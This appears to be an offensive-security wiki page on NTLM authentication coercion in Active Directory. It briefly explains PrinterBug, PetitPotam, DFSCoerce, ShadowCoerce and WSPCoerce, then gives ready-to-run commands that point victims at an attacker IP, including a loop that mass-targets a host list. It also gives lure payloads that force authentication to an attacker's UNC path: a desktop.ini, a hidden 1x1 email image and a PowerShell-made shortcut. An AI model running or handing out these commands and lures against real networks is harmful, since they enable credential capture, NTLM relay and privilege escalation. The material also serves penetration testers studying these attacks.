# NTLM Authentication Coercion Methods

## NTLM Authentication Coercion Methods [t-ad-ntlm-coerced_authentication_methods]

In Active Directory domains, attackers often rely on coerced authentications techniques, 
especially when attempting authentication relaying attacks (e.g. NTLM relay) or when abusing Kerberos delegations.
These techniques enable attackers to redirect traffic or redirect/force targets authentications. 
Attackers will then be able, in certain cases, to capture credentials or relay authentications.

The coerced authentications are made over SMB. But MS-RPRN abuse can be combined with WebClient 
abuse to elicit incoming authentications made over HTTP which heightens NTLM relay capabilities.

It is usually used to get and crack NetNTLM hashes or relay request to other services, but
can be also used for local privilege escalation.

There are some well known options:

1. MS-RPRN abuse (PrinterBug). 
Microsoft's Print Spooler is a service handling the print jobs and other various tasks 
related to printing. An attacker controling a domain user/computer can, with a specific RPC call, 
trigger the spooler service of a target running it and make it authenticate to a target of the attacker's 
choosing. This flaw is a "won't fix" and enabled by default on all Windows environments.

2. MS-EFSR abuse (PetitPotam)
Allows to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.
Abuse Microsoft's Encrypting File System Remote protocol available through \pipe\efsrpc, \pipe\lsarpc, 
\pipe\samr, \pipe\lsass and \pipeetlogon SMB named pipes.
Partially patched by Microsoft (CVE-2021-36942), but some of the MS-EFSR's methods are still accessible and vulnerable.

3. MS-DFSNM abuse (DFSCoerce)
Abuses Microsoft's Distributed File System Namespace Management protocol available through the \pipeetdfs SMB name pipe.
Vulnerable methods: NetrDfsRemoveStdRoot, NetrDfsAddStdRoot.

4. MS-FSRVP abuse (ShadowCoerce)
Abuses Microsoft's File Server Remote VSS available through the \pipe\FssagentRpc SMB named 
pipe (creating shadow copies of file shares on a remote computer). Service should be enabled on the target server, 
patched in June 2022 (CVE-2022-30154).

5. Windows Search Protocol (WSPCoerce)
Note: The Windows Search Service is NOT enabled by default on Windows Server so in practice 
this attack is only effective against Windows workstations.


###  Send the request to one of the vulnerable services




**option 1: dementor.py (PrinterBug)**

{% code overflow="wrap" %}
```bash
dementor.py -d domain.local -u user -p 'Password123' attacker_ip victim_ip

#for mass sending
for ip in `cat 445_ip.txt`; do python3 dementor.py -d domain -u user -p P@ssw0rd attacker_ip $ip;done

```
{% endcode %}

{% hint style="info" %}for webdav use shadow@80/test.txt as an attacker host


{% endhint %}


**option 2: PetitPotam.py (topotam)**

{% code overflow="wrap" %}
```bash
PetitPotam.py -u da -p 'P@ssw0rd' -d domain.local shadow@80/test.txt <target.domain.local> -pipe all
```
{% endcode %}

{% hint style="info" %}Null session can be use if not patched -d '' -u '' -p ''

{% endhint %}


**option 3: petitpotam.py (ly4k, PetitPotam)**

{% code overflow="wrap" %}
```bash
python3 petitpotam.py -debug 'user:Password123@victim-ip' '\attacker-ip\share\foo'

```
{% endcode %}


**option 4: dfscoerce.py**

{% code overflow="wrap" %}
```bash
python3 dfscoerce.py -d "pthub" -u "user" -p "Password123" attackerip victim-ip

```
{% endcode %}


**option 5: Coercer**

{% code overflow="wrap" %}
```bash
python3 Coercer.py coerce -l <attacker_ip> -t <target_ip> -u '<username>' -p '<password>' -d domain.com -v

```
{% endcode %}


**option 6: desktop.ini**

{% code overflow="wrap" %}
```bash
Put desktop.ini fine on a shared or user`s folder:

[.ShellClassInfo]
IconFile=\\10.10.16.153\aa
IconIndex=1337

```
{% endcode %}


**option 7: 1x1 Images in Emails**

{% code overflow="wrap" %}
```bash
<img src="\\10.10.123.102\test.ico" height="1" width="1" />

```
{% endcode %}


**option 8: Windows Shortcuts**

{% code overflow="wrap" %}
```bash
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
$shortcut.IconLocation = "\\10.10.123.102\test.ico"
$shortcut.Save()

```
{% endcode %}

